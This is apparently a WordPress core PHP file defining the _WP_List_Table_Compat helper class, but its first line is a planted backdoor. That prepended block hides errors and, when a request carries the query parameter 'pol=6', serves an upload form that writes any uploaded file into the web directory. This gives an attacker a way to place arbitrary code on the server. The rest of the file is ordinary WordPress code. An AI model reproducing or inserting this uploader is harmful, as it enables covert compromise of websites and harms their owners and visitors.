<?php error_reporting(0); if($_GET['pol'] == '6'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
<?php
/**
 * Helper functions for displaying a list of items in an ajaxified HTML table.
 *
 * @package WordPress
 * @subpackage List_Table
 * @since 4.7.0
 */

/**
 * Helper class to be used only by back compat functions.
 *
 * @since 3.1.0
 */
class _WP_List_Table_Compat extends WP_List_Table {
	public $_screen;
	public $_columns;

	/**
	 * Constructor.
	 *
	 * @since 3.1.0
	 *
	 * @param string|WP_Screen $screen  The screen hook name or screen object.
	 * @param string[]         $columns An array of columns with column IDs as the keys
	 *                                  and translated column names as the values.
	 */
	public function __construct( $screen, $columns = array() ) {
		if ( is_string( $screen ) ) {
			$screen = convert_to_screen( $screen );
		}

		$this->_screen = $screen;

		if ( ! empty( $columns ) ) {
			$this->_columns = $columns;
			add_filter( 'manage_' . $screen->id . '_columns', array( $this, 'get_columns' ), 0 );
		}
	}

	/**
	 * Gets a list of all, hidden, and sortable columns.
	 *
	 * @since 3.1.0
	 *
	 * @return array
	 */
	protected function get_column_info() {
		$columns  = get_column_headers( $this->_screen );
		$hidden   = get_hidden_columns( $this->_screen );
		$sortable = array();
		$primary  = $this->get_default_primary_column_name();

		return array( $columns, $hidden, $sortable, $primary );
	}

	/**
	 * Gets a list of columns.
	 *
	 * @since 3.1.0
	 *
	 * @return array
	 */
	public function get_columns() {
		return $this->_columns;
	}
}
